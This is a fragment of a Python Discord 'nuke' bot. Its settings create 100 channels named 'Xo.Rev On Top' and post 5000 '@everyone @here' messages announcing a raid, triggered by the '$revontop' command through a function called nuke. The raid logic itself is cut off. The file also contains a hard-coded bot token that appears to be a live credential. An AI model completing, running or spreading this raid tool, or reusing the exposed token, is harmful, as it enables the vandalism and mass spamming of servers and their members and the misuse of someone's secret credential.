...
BOT_TOKEN = "MTUwMjU5NzU5MzAxOTA1NjEyOA.GP_P1l.vxG_ICGfOeInZagJwXZuUKXhAoSx2JoFOd9ExM"
PREFIX = "$"

CHANNEL_NAME = "Xo.Rev On Top"
MESSAGE = "RAIDED BY Dnez @everyone @here"
AMOUNT_OF_CHANNELS = 100
AMOUNT_OF_MESSAGES = 5000
...
async def on_ready():
    ...
    print(f"Command: {PREFIX}revontop")
    print("=" * 50)

@bot.command(name="revontop")
async def nuke(ctx):
